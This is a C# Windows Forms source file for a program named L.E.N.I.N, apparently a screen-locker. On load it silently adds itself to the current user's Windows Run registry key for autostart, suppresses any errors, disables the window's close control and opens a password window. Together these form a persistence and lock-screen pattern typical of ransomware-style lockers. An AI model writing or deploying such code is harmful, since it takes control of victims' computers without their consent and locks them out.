using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;

namespace L.E.N.I.N
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void SetAutorunValue(string name, bool autorun)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;

            RegistryKey reg;

            reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
                
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch { }
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
            //SetAutorunValue(@"bin\Debug\netcoreapp3.1\L.E.N.I.N.exe", true);
            SetAutorunValue(@"L.E.N.I.N.exe", true);

            ControlBox = false;

            PasswordFrame pass = new PasswordFrame();

            pass.Show();
        }
    }
}
